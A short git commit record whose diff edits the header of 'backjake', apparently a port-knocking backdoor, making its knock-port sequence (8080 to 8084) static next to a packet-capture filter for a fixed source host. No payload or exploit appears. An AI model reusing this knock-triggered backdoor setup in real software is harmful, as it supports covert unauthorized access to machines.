89ecc96bfb44f634aab8df1cc58ff9dbf4b24dc0
root <root@localhost.localdomain>
2014-10-02 01:07:06 -0700

    so bored

--- backjake/backjake.h
+++ backjake/backjake.h
@@ -33,7 +33,8 @@
 #define FALSE               0
 #define CMD					"tcp and src host 10.0.0.28" // and src host %s and src port %d"
 
-int knockCode[] = {8080, 8081, 8082, 8083, 8084};
+static int knockCode[] = {8080, 8081, 8082, 8083, 8084};
+
 int ExitFlag;
 int running;
 
